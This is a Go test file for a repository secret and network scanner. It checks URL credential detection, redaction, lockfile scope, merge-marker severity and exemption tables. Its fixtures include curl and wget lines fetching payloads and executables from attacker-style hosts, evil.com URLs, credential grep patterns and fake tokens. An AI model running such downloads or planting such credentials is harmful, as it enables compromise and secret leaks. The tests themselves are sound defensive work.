package main

import (
	"context"
	"strings"
	"testing"
)

// An independent, adversarial review of the false-positive PR found each of
// these. Every case reproduced on the first version of the branch; the ones
// marked "regression" were reported by main and silenced by the PR.

// Regression: the "host made of regex syntax" rule tested everything after the
// `@` — path, query, and any punctuation glued to the URL — so a real credential
// in a Markdown link, a parenthetical, a shell substitution or a Go string was
// silenced.
func TestReview_PunctuationAroundAURLDoesNotHideItsCredential(t *testing.T) {
	for _, line := range []string{
		"(see postgres://svc:Xk9mQ2vLw8Rt@db.prod.acme.io:5432/app)",
		"[prod db](postgres://admin:Xk9mQ2vLw8Rt@db.prod.acme.io/app)",
		"|postgres://admin:Xk9mQ2vLw8Rt@db.prod.acme.io/app|",
		"export U=$(printf postgres://svc:Xk9mQ2vLw8Rt@db.prod.acme.io/app)",
		`s := "postgres://svc:Xk9mQ2vLw8Rt@db.prod.acme.io/app\n"`,
		"psql postgres://svc:Xk9mQ2vLw8Rt@db.prod.acme.io/app|less",
		"(postgres://svc:Xk9mQ2vLw8Rt@db.prod.acme.io)",
		"psql postgres://svc:Xk9mQ2vLw8Rt@db.prod.acme.io|less",
	} {
		if !firesCredsInURL(line) {
			t.Errorf("a real credential must be reported whatever punctuation surrounds it: %s", line)
		}
	}
	// The grep patterns the rule exists for are still recognised.
	for _, line := range []string{
		`if grep -qE 'postgresql://[^:]+:[^@]+@|sk_(test|live)_' "$f"; then`,
		`PATTERN='mysql://[^:]+:[^@]+@|mysql'`,
	} {
		if firesCredsInURL(line) {
			t.Errorf("a detection pattern must not be reported: %s", line)
		}
	}
}

// Regression + incomplete fix: a password may contain `@`, `#` and `?` at once
// (`P@ssw0rd#2024` is among the commonest password shapes there is). Reading the
// userinfo as ending at the last `@` BEFORE the first `?`/`#` turned that into
// the one-character password `P`; reading digits before a `#` as a port hid
// `8675309#Secret`. Both were reported on main.
func TestReview_PasswordsWithAtHashAndQuestionMark(t *testing.T) {
	for _, line := range []string{
		"mysql://root:8675309#Secret@db.prod.acme.io/app",
		"redis://default:123456?x=Zq8nRt4vLw2x@cache.prod.acme.io:6379/0",
		"postgres://admin:P@ssw0rd#2024@db.prod.acme.io/app",
		"postgres://admin:Ab@cd?ef9xyz@db.prod.acme.io/app",
		"postgres://admin:Xk9@mQ2vLw8Rt@db.prod.acme.io/app",
		"postgres://admin:Xk9#mQ2vLw8Rt@db.prod.acme.io/app",
	} {
		if !firesCredsInURL(line) {
			t.Errorf("must be reported: %s", line)
		}
	}
	// …and nothing of the password survives redaction.
	for in, leak := range map[string]string{
		"postgres://admin:P@ssw0rd#2024@db.prod.acme.io/app":              "ssw0rd",
		"mysql://root:8675309#Secret@db.prod.acme.io/app":                 "Secret",
		"redis://default:123456?x=Zq8nRt4vLw2x@cache.prod.acme.io:6379/0": "Zq8nRt4vLw2x",
		"postgres://admin:Ab@cd?ef9xyz@db.prod.acme.io/app":               "ef9xyz",
	} {
		if got := redactSecrets(in); strings.Contains(got, leak) {
			t.Errorf("part of the password survived redaction: %q -> %q", in, got)
		}
	}
	// A query that really is a query — `key=value` between the `?` and the last
	// `@` — still ends the userinfo before it.
	if got := redactSecrets("https://user:pw@host.acme.io?x=a@b"); got != "https://user:***@host.acme.io?x=a@b" {
		t.Errorf("an @ inside a key=value query must not be taken for the end of the userinfo: %q", got)
	}
	if firesCredsInURL("https://user:pw@host.acme.io?x=a@b") {
		t.Error("the password here is `pw`, two characters: shorthand")
	}
	if firesCredsInURL("https://user:changeme@host.acme.io?next=a@b.c") {
		t.Error("a placeholder followed by a key=value query must stay a placeholder")
	}
}

// Scope creep: the new lockfile names were added to the list every content gate
// consults, so secrets_scan and connection_strings stopped reading them too. But
// Podfile.lock, Package.resolved, mix.lock and pubspec.lock record git URLs
// verbatim, credentials included. The versions that fooled network_scan are the
// only thing these names should hide, and only from network_scan.
func TestReview_NewLockfilesAreSkippedOnlyByNetworkScan(t *testing.T) {
	const url = "https://deploy:Xk9mQ2vLw8Rt@github.com/acme/private.git"
	const aws = "aws_access_key_id = AKIA1A2B3C4D5E6F7G8H"
	// The line of a real uv.lock that network_scan reported eleven times: the
	// version sits in a file NAME, so no `version =` context excuses it.
	const pin = "sdist = { url = \"https://files.pythonhosted.org/packages/71/97/brotlicffi-1.2.0.2.tar.gz\" }\n"
	root := initRepoWithFiles(t, map[string]string{
		"uv.lock":         pin + "source = { git = \"" + url + "\" }\n",
		"Podfile.lock":    "EXTERNAL SOURCES:\n  Foo:\n    :git: " + url + "\n",
		"deploy/mix.lock": aws + "\n",
		"pixi.lock":       aws + "\n",
		"control.txt":     pin, // the same pin in an ordinary file: proves the fixture is reported
		"deploy.conf":     "primary = 51.222.140.163\n",
	})
	ctx := context.Background()

	net, err := checkNetworkScan(ctx, root, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range net {
		if strings.HasPrefix(f.FilePath, "uv.lock") {
			t.Errorf("network_scan must still skip the version pins in uv.lock: %+v", f)
		}
	}
	if !anyPathPrefix(net, "deploy.conf") || !anyPathPrefix(net, "control.txt") {
		t.Error("the control files must be reported by network_scan, or this test proves nothing about uv.lock")
	}

	conn, err := checkConnectionStrings(ctx, root, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, file := range []string{"uv.lock", "Podfile.lock"} {
		if !anyPathPrefix(conn, file) {
			t.Errorf("connection_strings must still read %s: a credential in a git URL is not bookkeeping", file)
		}
	}
	sec, err := checkSecretsScan(ctx, root, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, file := range []string{"deploy/mix.lock", "pixi.lock"} {
		if !anyPathPrefix(sec, file) {
			t.Errorf("secrets_scan must still read %s", file)
		}
	}
}

func anyPathPrefix(fs []Finding, file string) bool {
	for _, f := range fs {
		if strings.HasPrefix(f.FilePath, file+":") || f.FilePath == file {
			return true
		}
	}
	return false
}

// A conflict in a README code sample is the commonest conflict shape there is:
// two branches edit the same example. It is indistinguishable from an example of
// the syntax, so it must be VISIBLE at the default filter (warning), and the text
// must not assert that it is only documentation.
func TestReview_ConflictInACodeFenceIsVisibleAndHonest(t *testing.T) {
	doc := "# Install\n\n```bash\n<<<<<<< HEAD\nnpm install --global foo\n=======\nyarn global add foo\n>>>>>>> feature/yarn\n```\n"
	root := initRepoWithFiles(t, map[string]string{"README.md": doc})
	fs, err := checkMergeConflictMarkers(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(fs) != 1 {
		t.Fatalf("want one finding, got %+v", fs)
	}
	if fs[0].Severity != SeverityWarning {
		t.Errorf("severity = %s; info is hidden by default in the editor, and this may be a real conflict: want warning", fs[0].Severity)
	}
	if strings.Contains(fs[0].Message, "not an unresolved conflict") {
		t.Errorf("the message must not claim it is only documentation: %q", fs[0].Message)
	}
	// One complete conflict is an example; anything more in the same block is not.
	more := "```\n" + conflictExample + "<<<<<<< HEAD\nstill going\n```\n"
	if got, _ := mergeMarkerVerdict(t, "b.md", more); got != SeverityError {
		t.Errorf("a complete conflict followed by another, unfinished one in the same block = %q, want error", got)
	}
	two := "```\n" + conflictExample + conflictExample + "```\n"
	if got, _ := mergeMarkerVerdict(t, "c.md", two); got != SeverityError {
		t.Errorf("two conflicts in one block = %q, want error", got)
	}
}

// Hosts and paths crafted to match the http_remote exemption tables. Each was
// reported on main.
func TestReview_ExemptionTablesCannotBeGamed(t *testing.T) {
	for _, line := range []string{
		"curl -O http://ocsp.acme-cdn.io/installer.sh",
		"curl -O http://crl.attacker-cdn.ru/payload.sh",
		"http://keys.acme.io/private_key.der",
		"wget http://www.apache.org/licenses/../dist/tomcat/apache-tomcat-9.0.1.zip",
		"wget http://www.mozilla.org/mplayer-setup.exe",
		"wget http://scripts.sil.org/ofl-update.exe",
		"wget http://json-schema.org/drafts/agent.exe",
		"http://10.evil.com/x",
		"http://0177.0.0.1.evil.com/x",
		"http://0x7f.evil.com/x",
	} {
		if !firesHTTPRemote(line) {
			t.Errorf("must still be reported: %s", line)
		}
	}
	// What the tables are for still works.
	for _, line := range []string{
		"http://ocsp.digicert.com",
		"http://ocsp.digicert.com/",
		"http://crl.godaddy.com/gdroot-g2.crl",
		"http://cacerts.digicert.com/DigiCertGlobalRootG2.crt",
		"http://scripts.sil.org/OFL",
		"http://scripts.sil.org/OFL_web",
		"http://www.mozilla.org/MPL/2.0/",
		"http://json-schema.org/draft-07/schema#",
		"http://json-schema.org/draft/2020-12/schema",
		"http://www.apache.org/licenses/LICENSE-2.0",
	} {
		if firesHTTPRemote(line) {
			t.Errorf("must not be reported: %s", line)
		}
	}
}

// One unrelated comment must not label the whole block as a counter-example, and
// an `<html>` tag is not a type placeholder.
func TestReview_MarkdownLabelsAreNarrow(t *testing.T) {
	bad := "name: Smoke: engine syntax"
	for name, body := range map[string]string{
		"an unrelated Don't comment":  "# Don't: expose 5432 publicly\n" + bad,
		"an unrelated Avoid comment":  bad + "\n# Avoid - root user in production",
		"a mid-block Invalid comment": "a: 1\n# Invalid: use 'image' not 'img'\n" + bad,
	} {
		if got := invalidPayloadFindings(t, mdBlock("yaml", body)); len(got) != 1 {
			t.Errorf("%s: still invalid, must be reported; got %d", name, len(got))
		}
	}
	// The first line of a block IS its label.
	if got := invalidPayloadFindings(t, mdBlock("yaml", "# Bad: a colon inside a plain scalar\n"+bad)); len(got) != 0 {
		t.Errorf("a first-line label must still work: %+v", got)
	}
	// "Directly above" means one blank line at most.
	if got := invalidPayloadFindings(t, "**Bad**:\n\n"+mdBlock("yaml", bad)); len(got) != 0 {
		t.Errorf("a label with one blank line before the fence must still work: %+v", got)
	}
	if got := invalidPayloadFindings(t, "**Bad**:\n\n\n"+mdBlock("yaml", bad)); len(got) != 1 {
		t.Errorf("a label two blank lines above is not 'directly above'; got %d findings", len(got))
	}
	// An angle tag standing alone (markup, not a JSON value) is not a placeholder;
	// one in VALUE position is.
	for _, body := range []string{"<html>", "<response>", "<div><p>hi</p></div>"} {
		if got := invalidPayloadFindings(t, mdBlock("json", body)); len(got) != 1 {
			t.Errorf("%q in a json block is not JSON: must be reported; got %d", body, len(got))
		}
	}
	if got := invalidPayloadFindings(t, mdBlock("json", "{\"n\": <integer>, \"xs\": [<item>, <item>]}")); len(got) != 0 {
		t.Errorf("placeholders in value position must be accepted: %+v", got)
	}
	// A valid document followed by an unterminated comment is NOT "valid once
	// comments are removed": the comment never ends.
	if got := invalidPayloadFindings(t, mdBlock("json", "{\"a\": 1} /* never closed")); len(got) != 1 {
		t.Errorf("an unterminated block comment must not be eaten; got %d findings", len(got))
	}
}

// Real allocations that happen to look like a pattern.
func TestReview_RealAddressesAreNotPlaceholders(t *testing.T) {
	for _, ip := range []string{"52.20.30.40", "104.16.0.10", "100.10.20.30"} {
		if got := networkCats(t, "host = "+ip); len(got) != 1 || got[0] != "warning/ipv4_public" {
			t.Errorf("%s must stay a public-address warning; got %v", ip, got)
		}
	}
	for _, ip := range []string{"114.114.114.114", "114.114.115.115", "223.5.5.5", "223.6.6.6", "119.29.29.29", "180.76.76.76"} {
		if got := networkCats(t, "dns = "+ip); len(got) != 1 || got[0] != "info/ipv4_public-resolver" {
			t.Errorf("%s is a public resolver; got %v", ip, got)
		}
	}
	// Step 1 and repeated octets stay: they are how invented addresses look.
	for _, ip := range []string{"100.1.2.3", "100.4.5.6", "2.2.2.2", "100.1.1.1"} {
		if got := networkCats(t, "peer = "+ip); len(got) != 1 || got[0] != "info/ipv4_doc-placeholder" {
			t.Errorf("%s should stay an info placeholder; got %v", ip, got)
		}
	}
}

// The username is not the secret: a token in the user slot with a one-character
// password (`https://<token>:x@github.com`) is a credential too.
func TestReview_TokenInTheUserSlot(t *testing.T) {
	for _, line := range []string{
		"git clone https://Xk9mQ2vLw8RtZp3nYb6c:x@github.com/acme/private.git",
		"https://ghp_Ab12Cd34Ef56Gh78Ij90Kl12Mn34:x@github.com/o/r.git",
	} {
		if !firesCredsInURL(line) {
			t.Errorf("a token-shaped user must not be hidden by a one-character password: %s", line)
		}
	}
	// Prose shorthand is still shorthand.
	for _, line := range []string{"scheme://u:p@host", "https://user:x@host.io/a"} {
		if firesCredsInURL(line) {
			t.Errorf("shorthand must stay silent: %s", line)
		}
	}
}

// The fence logic had no test that would fail if its details were wrong.
func TestReview_FenceMechanics(t *testing.T) {
	// A ``` block is not closed by a ~~~ line, and the conflict after it is real
	// only if it is outside a block; here everything stays inside one block.
	mixed := "```\n~~~\n" + conflictExample + "```\n"
	if got, _ := mergeMarkerVerdict(t, "a.md", mixed); got != SeverityWarning {
		t.Errorf("a ~~~ line must not close a ``` block: %q, want the fenced-conflict severity", got)
	}
	mixed2 := "~~~\n```\n" + conflictExample + "~~~\n"
	if got, _ := mergeMarkerVerdict(t, "b.md", mixed2); got != SeverityWarning {
		t.Errorf("a ``` line must not close a ~~~ block: %q", got)
	}
	// A shorter fence does not close a longer one.
	short := "````\n```\n" + conflictExample + "````\n"
	if got, _ := mergeMarkerVerdict(t, "c.md", short); got != SeverityWarning {
		t.Errorf("a 3-backtick line must not close a 4-backtick block: %q", got)
	}
	// .mdx is Markdown.
	if got, _ := mergeMarkerVerdict(t, "d.mdx", "```\n"+conflictExample+"```\n"); got != SeverityWarning {
		t.Errorf(".mdx files get the same fence treatment: %q", got)
	}
	// Ordering is required, not merely the presence of the three markers.
	for name, body := range map[string]string{
		"close before open":   ">>>>>>> x\n=======\n<<<<<<< HEAD\n",
		"separator first":     "=======\n<<<<<<< HEAD\n>>>>>>> x\n",
		"separator after all": "<<<<<<< HEAD\n>>>>>>> x\n=======\n",
		"no separator":        "<<<<<<< HEAD\nx\n>>>>>>> y\n",
	} {
		if got, _ := mergeMarkerVerdict(t, "o.md", "```\n"+body+"```\n"); got != SeverityError {
			t.Errorf("%s: a block that is not one complete, ordered conflict = %q, want error", name, got)
		}
	}
}

// A setext heading underline (`=======`) is something a code block may hold
// before the example starts; it must not be read as the conflict's separator.
func TestReview_SetextUnderlineBeforeTheExampleIsNotASeparator(t *testing.T) {
	doc := "```\nTitle\n=======\n" + conflictExample + "```\n"
	if got, _ := mergeMarkerVerdict(t, "a.md", doc); got != SeverityWarning {
		t.Errorf("an underline before a complete example must not turn it into an error: %q", got)
	}
}
